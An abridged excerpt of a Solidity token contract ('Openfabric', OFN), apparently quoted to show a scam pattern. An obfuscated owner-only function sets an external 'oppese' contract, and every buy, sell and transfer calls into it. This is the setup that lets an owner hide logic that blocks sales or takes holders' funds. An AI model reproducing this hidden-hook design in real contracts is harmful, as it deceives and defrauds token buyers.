...
contract TokenM is ERC20 {
    ...
    IQrteAmountoppese public oppese;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Openfabric", "OFN") {
    ...
    function cerfuakeBoouneRvvc(IQrteAmountoppese _oppese) public onlyOwner {
        oppese = _oppese;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                oppese.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				oppese.addOutAmount(from, amount);
            }else{
                oppese.addOutAmount(from, amount);
                takeFee = false;
            }
